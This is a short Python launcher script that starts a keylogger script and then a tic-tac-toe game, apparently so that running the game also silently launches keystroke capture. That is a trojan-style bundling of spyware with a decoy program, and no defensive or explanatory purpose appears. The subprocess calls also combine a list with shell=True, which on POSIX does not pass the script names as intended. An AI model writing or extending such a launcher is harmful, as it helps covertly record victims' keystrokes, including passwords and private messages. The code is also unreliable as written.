import subprocess

if __name__ == "__main__":
    # Run Keylogger in a separate process with the same Python interpreter
    subprocess.run(["python", "keylogger.py"], shell=True)

    # Run Tic Tac Toe in a separate process after Keylogger
    subprocess.run(["python", "tic_tac_toe.py"], shell=True)    